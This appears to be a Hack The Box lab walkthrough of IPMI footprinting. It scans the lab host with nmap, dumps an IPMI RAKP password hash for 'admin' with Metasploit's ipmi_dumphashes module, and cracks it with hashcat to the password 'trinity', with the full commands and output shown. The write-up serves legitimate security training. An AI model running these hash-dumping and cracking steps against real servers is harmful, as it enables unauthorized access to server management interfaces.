# &#x1F6A9; IPMI Footprinting <br>
<mark>Hack The Box Penetration Tester Path full walkthrough <a href="https://github.com/sudo-st8less?tab=repositories">catalog</a>.</mark><br><br>
<mark>hook it up with a &#x2B50; if this helps!</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>
<br>
<br>
Target IP:
10.129.202.5

	
---
### TTP Question 1:
What username is configured for accessing the host via IPMI?

pop off with a scan:

	$ sudo nmap -sU --script=ipmi-version -p 623 10.129.202.5
	
		Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-26 18:55 CDT
		Nmap scan report for 10.129.202.5
		Host is up (0.0090s latency).
		
		PORT    STATE SERVICE
		623/udp open  asf-rmcp
		| ipmi-version: 
		|   Version: 
		|     IPMI-2.0
		|   UserAuth: password, md5, md2, null
		|   PassAuth: auth_msg, auth_user, non_null_user
		|_  Level: 1.5, 2.0
		
		Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds

then jumped into MSF to search for exploits:

	$ msfconsole
			Metasploit tip: Use the analyze command to suggest runnable modules for 
			hosts
			                                                  
			  +-------------------------------------------------------+
			  |  METASPLOIT by Rapid7                                 |
			  +---------------------------+---------------------------+
			  |      __________________   |                           |
			  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
			  |             )=\           | |  EXPLOIT   \            |
			  |            // \\          | |_____________\_______    |
			  |           //   \\         | |==[msf >]============\   |
			  |          //     \\        | |______________________\  |
			  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
			  |        //         \\      |  *********************    |
			  +---------------------------+---------------------------+
			  |      o O o                |        \'\/\/\/'/         |
			  |              o O          |         )======(          |
			  |                 o         |       .'  LOOT  '.        |
			  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
			  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
			  | |________________|__|)__| |    |     __||_)     |     |
			  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
			  |  = = = = = = = = = = = =  |     '--------------'      |
			  +---------------------------+---------------------------+
			
			
			       =[ metasploit v6.4.43-dev                          ]
			+ -- --=[ 2483 exploits - 1279 auxiliary - 393 post       ]
			+ -- --=[ 1463 payloads - 49 encoders - 13 nops           ]
			+ -- --=[ 9 evasion                                       ]
			
			Metasploit Documentation: https://docs.metasploit.com/
			
			[msf](Jobs:0 Agents:0) >> search ipmi
			
			Matching Modules
			================
			
			   #   Name                                                                Disclosure Date  Rank    Check  Description
			   -   ----                                                                ---------------  ----    -----  -----------
			   0   auxiliary/scanner/ipmi/ipmi_cipher_zero                             2013-06-20       normal  No     IPMI 2.0 Cipher Zero Authentication Bypass Scanner
			   1   auxiliary/scanner/ipmi/ipmi_dumphashes                              2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
			   2   auxiliary/scanner/ipmi/ipmi_version                                 .                normal  No     IPMI Information Discovery
			   3   exploit/multi/upnp/libupnp_ssdp_overflow                            2013-01-29       normal  No     Portable UPnP SDK unique_service_name() Remote Code Execution
			   4     \_ target: Automatic                                              .                .       .      .
			   5     \_ target: Supermicro Onboard IPMI (X9SCL/X9SCM) Intel SDK 1.3.1  .                .       .      .
			   6     \_ target: Axis Camera M1011 5.20.1 UPnP/1.4.1                    .                .       .      .
			   7     \_ target: Debug Target                                           .                .       .      .
			   8   auxiliary/scanner/http/smt_ipmi_cgi_scanner                         2013-11-06       normal  No     Supermicro Onboard IPMI CGI Vulnerability Scanner
			   9   auxiliary/scanner/http/smt_ipmi_49152_exposure                      2014-06-19       normal  No     Supermicro Onboard IPMI Port 49152 Sensitive File Exposure
			   10  auxiliary/scanner/http/smt_ipmi_static_cert_scanner                 2013-11-06       normal  No     Supermicro Onboard IPMI Static SSL Certificate Scanner
			   11  exploit/linux/http/smt_ipmi_close_window_bof                        2013-11-06       good    Yes    Supermicro Onboard IPMI close_window.cgi Buffer Overflow
			   12  auxiliary/scanner/http/smt_ipmi_url_redirect_traversal              2013-11-06       normal  No     Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal
			
			
			Interact with a module by name or index. For example info 12, use 12 or use auxiliary/scanner/http/smt_ipmi_url_redirect_traversal
      
use the ipmi scanner:

			[msf](Jobs:0 Agents:0) >> use 2
			[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_version) >> show options
			
			Module options (auxiliary/scanner/ipmi/ipmi_version):
			
			   Name       Current Setting  Required  Description
			   ----       ---------------  --------  -----------
			   BATCHSIZE  256              yes       The number of hosts to probe in each set
			   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.h
			                                         tml
			   RPORT      623              yes       The target port (UDP)
			   THREADS    10               yes       The number of concurrent threads
			
			
			View the full module info with the info, or info -d command.
      
set parameters in options:

			[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_version) >> set rhosts 10.129.202.5
			rhosts => 10.129.202.5
			[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_version) >> show options
			
			Module options (auxiliary/scanner/ipmi/ipmi_version):
			
			   Name       Current Setting  Required  Description
			   ----       ---------------  --------  -----------
			   BATCHSIZE  256              yes       The number of hosts to probe in each set
			   RHOSTS     10.129.202.5     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.h
			                                         tml
			   RPORT      623              yes       The target port (UDP)
			   THREADS    10               yes       The number of concurrent threads
			
			
			View the full module info with the info, or info -d command.
      
run the tool:

			[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_version) >> exploit
			[*] Sending IPMI requests to 10.129.202.5->10.129.202.5 (1 hosts)
			[+] 10.129.202.5:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
			[*] Scanned 1 of 1 hosts (100% complete)
			[*] Auxiliary module execution completed

Now I'll search with the version scanner:

			[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_version) >> search ipmi
			
			Matching Modules
			================
			
			   #   Name                                                                Disclosure Date  Rank    Check  Description
			   -   ----                                                                ---------------  ----    -----  -----------
			   0   auxiliary/scanner/ipmi/ipmi_cipher_zero                             2013-06-20       normal  No     IPMI 2.0 Cipher Zero Authentication Bypass Scanner
			   1   auxiliary/scanner/ipmi/ipmi_dumphashes                              2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
			   2   auxiliary/scanner/ipmi/ipmi_version                                 .                normal  No     IPMI Information Discovery
			   3   exploit/multi/upnp/libupnp_ssdp_overflow                            2013-01-29       normal  No     Portable UPnP SDK unique_service_name() Remote Code Execution
			   4     \_ target: Automatic                                              .                .       .      .
			   5     \_ target: Supermicro Onboard IPMI (X9SCL/X9SCM) Intel SDK 1.3.1  .                .       .      .
			   6     \_ target: Axis Camera M1011 5.20.1 UPnP/1.4.1                    .                .       .      .
			   7     \_ target: Debug Target                                           .                .       .      .
			   8   auxiliary/scanner/http/smt_ipmi_cgi_scanner                         2013-11-06       normal  No     Supermicro Onboard IPMI CGI Vulnerability Scanner
			   9   auxiliary/scanner/http/smt_ipmi_49152_exposure                      2014-06-19       normal  No     Supermicro Onboard IPMI Port 49152 Sensitive File Exposure
			   10  auxiliary/scanner/http/smt_ipmi_static_cert_scanner                 2013-11-06       normal  No     Supermicro Onboard IPMI Static SSL Certificate Scanner
			   11  exploit/linux/http/smt_ipmi_close_window_bof                        2013-11-06       good    Yes    Supermicro Onboard IPMI close_window.cgi Buffer Overflow
			   12  auxiliary/scanner/http/smt_ipmi_url_redirect_traversal              2013-11-06       normal  No     Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal
			
			
			Interact with a module by name or index. For example info 12, use 12 or use auxiliary/scanner/http/smt_ipmi_url_redirect_traversal
			
			[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_version) >> use 1

  Set parameters:
  
			[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> show options
			
			Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
			
			   Name                  Current Setting                        Required  Description
			   ----                  ---------------                        --------  -----------
			   CRACK_COMMON          true                                   yes       Automatically crack common passwords as they are obtained
			   OUTPUT_HASHCAT_FILE                                          no        Save captured password hashes in hashcat format
			   OUTPUT_JOHN_FILE                                             no        Save captured password hashes in john the ripper format
			   PASS_FILE             /usr/share/metasploit-framework/data/  yes       File containing common passwords for offline cracking, one per lin
			                         wordlists/ipmi_passwords.txt                     e
			   RHOSTS                                                       yes       The target host(s), see https://docs.metasploit.com/docs/using-met
			                                                                          asploit/basics/using-metasploit.html
			   RPORT                 623                                    yes       The target port
			   SESSION_MAX_ATTEMPTS  5                                      yes       Maximum number of session retries, required on certain BMCs (HP iL
			                                                                          O 4, etc)
			   SESSION_RETRY_DELAY   5                                      yes       Delay between session retries in seconds
			   THREADS               1                                      yes       The number of concurrent threads (max one per host)
			   USER_FILE             /usr/share/metasploit-framework/data/  yes       File containing usernames, one per line
			                         wordlists/ipmi_users.txt
			
			
			View the full module info with the info, or info -d command.
			
			[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> set rhosts 10.129.202.5
			rhosts => 10.129.202.5

  Run it boo boo:
  
			[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> exploit
			[+] 10.129.202.5:623 - IPMI - Hash found: admin:bf45e79a820000002662b3666e445a74959181a91beafcc9afa56a22bd93f77a463a053a70fb965ba123456789abcdefa123456789abcdef140561646d696e:f88241e866d9ca37d36c7b9dd5e65ec639408620
			[*] Scanned 1 of 1 hosts (100% complete)
			[*] Auxiliary module execution completed

&#x1F6A9;found cred **admin**<br>
&#x1F6A9;found pw hash:
**f88241e866d9ca37d36c7b9dd5e6--edit--**


---
### TTP Question 2:
What is the account's cleartext password?

I put both hashes in hashbrown.txt, grabbed rockyou from github.

then ran hashcat -m7300 with above files:

	$ hashcat -m 7300 hashbrown.txt rockyou.txt 
	
		hashcat (v6.2.6) starting
		
		OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
		==================================================================================================================================================
		* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped
		
		OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
		==================================================================
		* Device #2: AMD EPYC 7543 32-Core Processor, 3923/7910 MB (988 MB allocatable), 4MCU
		
		Minimum password length supported by kernel: 0
		Maximum password length supported by kernel: 256
		
		Hashes: 1 digests; 1 unique digests, 1 unique salts
		Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
		Rules: 1
		
		Optimizers applied:
		* Zero-Byte
		* Not-Iterated
		* Single-Hash
		* Single-Salt
		
		ATTENTION! Pure (unoptimized) backend kernels selected.
		Pure kernels can crack longer passwords, but drastically reduce performance.
		If you want to switch to optimized kernels, append -O to your commandline.
		See the above message to find out about the exact limits.
		
		Watchdog: Hardware monitoring interface not found on your system.
		Watchdog: Temperature abort trigger disabled.
		
		Host memory required for this attack: 1 MB
		
		Dictionary cache built:
		* Filename..: rockyou.txt
		* Passwords.: 14344391
		* Bytes.....: 139921497
		* Keyspace..: 14344384
		* Runtime...: 1 sec
		
		bf45e79a820000002662b3666e445a74959181a91beafcc9afa56a22bd93f77a463a053a70fb965ba123456789abcdefa123456789abcdef140561646d696e:f88241e866d9ca37d36c7b9dd5e65ec639408620:trinity
		                                                          
		Session..........: hashcat
		Status...........: Cracked
		Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
		Hash.Target......: bf45e79a820000002662b3666e445a74959181a91beafcc9afa...408620
		Time.Started.....: Wed Aug 27 01:37:58 2025 (0 secs)
		Time.Estimated...: Wed Aug 27 01:37:58 2025 (0 secs)
		Kernel.Feature...: Pure Kernel
		Guess.Base.......: File (rockyou.txt)
		Guess.Queue......: 1/1 (100.00%)
		Speed.#2.........:  3871.6 kH/s (0.35ms) @ Accel:512 Loops:1 Thr:1 Vec:8
		Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
		Progress.........: 2048/14344384 (0.01%)
		Rejected.........: 0/2048 (0.00%)
		Restore.Point....: 0/14344384 (0.00%)
		Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
		Candidate.Engine.: Device Generator
		Candidates.#2....: 123456 -> lovers1
		
		Started: Wed Aug 27 01:37:52 2025
		Stopped: Wed Aug 27 01:37:59 2025


&#x1F6A9; found pw **trinity**
